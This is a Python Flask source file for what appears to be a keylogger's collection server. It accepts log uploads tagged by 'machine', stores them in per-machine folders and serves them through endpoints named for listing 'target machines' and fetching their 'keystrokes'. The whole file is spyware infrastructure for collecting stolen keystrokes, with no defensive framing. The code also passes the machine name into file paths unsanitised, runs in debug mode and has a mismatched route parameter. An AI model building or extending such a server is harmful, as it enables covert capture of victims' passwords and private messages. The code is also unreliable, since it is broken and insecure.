from flask import request, Flask, jsonify
import time
import os

app = Flask(__name__)

@app.route('/')
def home():
    return "Server is running"

def make_file_name():
    return f"log_{int(time.time())}.txt"

@app.route('/api/upload', methods=['POST'])
def upload():
    data = request.get_json()
    if not data or "machine" not in data or "data" not in data:
        return jsonify({"error": "Invalid data"}), 400

    machine = data["machine"]
    log_data = data["data"]

    machine_folder = os.path.join("logs", machine)
    if  not os.path.exists(machine_folder):
        os.makedirs(machine_folder)

    file_name = make_file_name()
    file_path = os.path.join(machine_folder, file_name)

    with open(file_path, "w") as f:
        f.write(str(log_data))

    return jsonify({"status": "success", "file": file_name}), 200

@app.route('/api/get_target_machines_list', methods=['GET'])
def get_target_machines_list():
    if not os.path.exists("logs"):
        return jsonify([])

    machines = [d for d in os.listdir("logs") if os.path.isdir(os.path.join("logs", d))]
    return jsonify(machines)

@app.route('/api/get_target_machine_keystrokes/<machine>', methods=['GET'])
def get_target_machine_keystrokes(target_machine):
    machine_folder = os.path.join("logs", target_machine)
    if not os.path.exists(machine_folder):
        return jsonify({"error": "Machine not found"}), 404

    logs = {}
    for file_name in os.listdir(machine_folder):
        file_path = os.path.join(machine_folder, file_name)
        with open(file_path, "r") as f:
            logs[file_name] = f.read()

    return jsonify(logs)

if __name__ == "__main__":
    app.run(debug=True)
